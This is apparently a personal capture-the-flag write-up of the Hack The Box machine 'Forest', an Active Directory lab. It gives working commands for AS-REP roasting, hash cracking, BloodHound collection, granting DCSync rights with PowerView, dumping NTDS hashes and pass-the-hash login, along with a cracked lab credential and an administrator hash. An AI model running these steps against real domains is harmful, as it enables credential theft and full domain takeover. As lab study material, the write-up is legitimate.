---
Status: Done
OS: Windows AD
Difficulty: Easy
tags:
  - nxc
  - SMB
  - asreproast
  - WriteDacl
Date: 2026-07-02T13:50:00
Owned: 2026-07-03T15:40:00
---

---
# Enumeration
## port scan
rustscan  
![[Pasted image 20260702135058.png]]

use enum4linux gain username ->asreproast  

# svc-alfresco
anonymous access❌ no shares but valid  
guest access ❌  
enumerate users  
```sh
nxc smb 10.129.95.210 -u '' -p '' --users
nxc smb 10.129.95.210 -u '' -p '' --users-export domainusers.txt
```
![[Pasted image 20260702220544.png]]
--users-export we can easily get user list  
![[Pasted image 20260702221844.png]]
enumuser again with --ridbrute  
![[Pasted image 20260702221950.png]]
access denied  

## Asreproast

since we have user list without password we can perform asreproast which look for no-preauth 
this time instead of impacket's getNPUsers, imma use the nxc module  
```sh
nxc ldap 10.129.95.210 -u domainusers.txt -p '' --asreproast asrep.txt
```
![[Pasted image 20260702222658.png]]
we got TGS for svc-alfresco  
let's crack with hashcat  
```sh
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```
cracked  
![[Pasted image 20260702222911.png]]
svc-alfresco:s3rvice  

once we have the cred we gonna use nxcspray to see where we can use that cred  
```sh
nxcspray all 10.129.95.210 -u svc-alfresco -p s3rvice
```
![[Pasted image 20260702223222.png]]
pwned on winrm  
![[Pasted image 20260702223537.png]]
connect and retrieve the flag  

# Privilege Escalation

checked history  
checked priv  

since we have one valid creds let's try kerberoast  
again instead of using impacket's getUsersSPNs, imma use nxc kerberoast  
```sh
nxc ldap 10.129.95.210 -u svc-alfresco -p s3rvice --kerberoasting kerb.txt
```
![[Pasted image 20260702224841.png]]
none D:  

there is folder for sebastien but we cannot access  
![[Pasted image 20260702233337.png]]

checking share with creds  
![[Pasted image 20260702232823.png]]
nothing interesting, no new cred found  

let's do bloodhound  
we can use sharphound as collectors  
```sh
.\SharpHound.exe -c All --zipfilename htb.local
```
again I'm trying out nxc collector  
```sh
nxc ldap 10.129.95.250 -u svc-alfresco -p s3rvice --bloodhound --collection All
```
error dependencies the .nxc.conf tell nxc to use bloodhound-ce but we only have bloodhoud-python(legacy one) installed 
![[Pasted image 20260703120424.png]]

```sh
sudo apt install bloodhound-ce-python
```
error failed to resolve need to add `--dns-server <ip>`
![[Pasted image 20260703120143.png]]
```sh
nxc ldap <ip> -u <username> -p <password> --bloodhound --collection -All --dns-server <ip>
```
done
![[Pasted image 20260703120114.png]]
```sh
cp /home/putthi/.nxc/logs/FOREST_10.129.95.210_2026-07-03_120002_bloodhound.zip .
```
import the file to bloodhound  
![[Pasted image 20260703131909.png]]
shortest path to domain admin  
![[Pasted image 20260703132029.png]]
add svc-alfresco to the EXCHANGE WINDOWS PERMISSION group  
![[Pasted image 20260703134025.png]]
```
net group "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco /add
```
![[Pasted image 20260703134328.png]]
after a while the group was reset  
![[Pasted image 20260703134456.png]]
create new user instead  
![[Pasted image 20260703134627.png]]
add the user to the group  
![[Pasted image 20260703134646.png]]

if we click on the WriteDACL there will be how to abuse shown  
![[Pasted image 20260703132905.png]]
create PScredential object  
```powershell
$password = ConvertTo-SecureString "Passw0rd123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("htb.local\hacker", $password)
```
Note: make sure using the right slash  
```powershell
$cred = New-Object System.Management.Automation.PSCredential("htb.local/hacker", $password)
```
in the beginning I couldn't add ACL since I use $cred with forward slash `/`  
![[Pasted image 20260703135222.png]]

use Add-DomainObjectAcl to run this command we need to import Powerview.ps1 first  
```powershell
upload PowerView.ps1
. .\PowerView.ps1
```
then add  
```powershell
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb, DC=local" -PrincipalIdentity hacker -Rights DCSync
```
![[Pasted image 20260703143845.png]]

now our account can perform DCSync  
use netexec  
![[Pasted image 20260703144314.png]]
```sh
grep -iv disabled FOREST_10.129.95.210_2026-07-03_144139.ntds | cut -d ':' -f1,4
```
![[Pasted image 20260703144521.png]]
evil-winrm using administrator hash  
```sh
evil-winrm -i 10.129.95.210 -u administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
```
![[Pasted image 20260703145714.png]]

# Lesson Learned
Be careful using forward or backslash, especially on windows machine.  